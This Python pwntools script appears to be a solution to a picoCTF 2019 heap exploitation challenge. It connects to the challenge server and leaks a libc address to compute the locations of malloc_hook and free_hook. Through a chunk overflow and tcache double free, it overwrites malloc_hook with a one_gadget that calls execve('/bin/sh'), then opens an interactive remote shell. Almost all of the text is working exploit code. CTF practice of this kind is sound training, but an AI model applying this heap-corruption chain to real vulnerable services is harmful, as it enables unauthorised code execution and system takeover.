from pwn import *
import sys
import time

p = remote('2019shell1.picoctf.com', 49929)
DEBUG = False

def malloc(size, text):
	global p
	p.sendline('1')
	p.sendline(str(size))
	p.sendline(text)
	print("Chunk of size " + str(size) + " with text " + text + " created")
	p.recvuntil("3. Exit")
	time.sleep(0.01)

def free(index):
	global p
	p.sendline('2')
	p.sendline(str(index))
	print("Chunk at index " + str(index) + " freed")
	p.recvuntil("3. Exit")
	time.sleep(0.01)

def main():
	global p

	if DEBUG:
		print("Running in debug mode")

	for _ in range(2): p.recvline()

	# Max 20 characters
	p.sendline('y'*10)

	for _ in range(2): p.recvline()

	address = p.recvline()
	address = int(address[address.index(':') + 4:], 16)
	print('C system() address: ' + str(hex(address)))

	p.recvuntil("3. Exit")

	system_offset = 0x52fd0

	libc_base_addr = address - system_offset
	print('C base address: ' + str(hex(libc_base_addr)))

	malloc_hook_offset = 0x1e4c30

	malloc_hook_addr = libc_base_addr + malloc_hook_offset
	print('C malloc_hook address: ' + str(hex(malloc_hook_addr)))

	free_hook_offset = 0x1e75a8

	free_hook_addr = libc_base_addr + free_hook_offset
	print('C free_hook address: ' + str(hex(free_hook_addr)))

	if DEBUG: raw_input()

	# Implement solution in notes
	malloc(24, '')
	malloc(288, '')
	free(1)
	free(0)

	if DEBUG: raw_input()

	# Overflow 2nd chunk's size and free it to create a double free
	malloc(24, 'A'*24)
	free(1)

	if DEBUG: raw_input()

	# Malloc to overwrite the next cache pointer
	malloc(248, p64(malloc_hook_addr))
	malloc(288, 'BBBBBBBBBBBBBBBB')

	if DEBUG: raw_input()

	# Overwrite the hook
	"""
	0xe237f execve("/bin/sh", rcx, [rbp-0x70])
	constraints:
	  [rcx] == NULL || rcx == NULL
	  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

	0xe2383 execve("/bin/sh", rcx, rdx)
	constraints:
	  [rcx] == NULL || rcx == NULL
	  [rdx] == NULL || rdx == NULL

	0xe2386 execve("/bin/sh", rsi, rdx)
	constraints:
	  [rsi] == NULL || rsi == NULL
	  [rdx] == NULL || rdx == NULL

	0x106ef8 execve("/bin/sh", rsp+0x70, environ)
	constraints:
	  [rsp+0x70] == NULL

	0x106f04 execve("/bin/sh", rsi, [rax])
	constraints:
	  [rsi] == NULL || rsi == NULL
	  [[rax]] == NULL || [rax] == NULL
	"""
	one_gadget = libc_base_addr + 0x106ef8
	print('one_gadget address: ' + str(hex(one_gadget)))
	malloc(288, p64(one_gadget))

	if DEBUG:
		gdb.attach(p)
		raw_input()

	# Execute the hook
	p.sendline('1')
	p.sendline("288")
	p.sendline("/bin/sh")

	print("Opening shell...")
	time.sleep(0.5)
	p.interactive()

main()
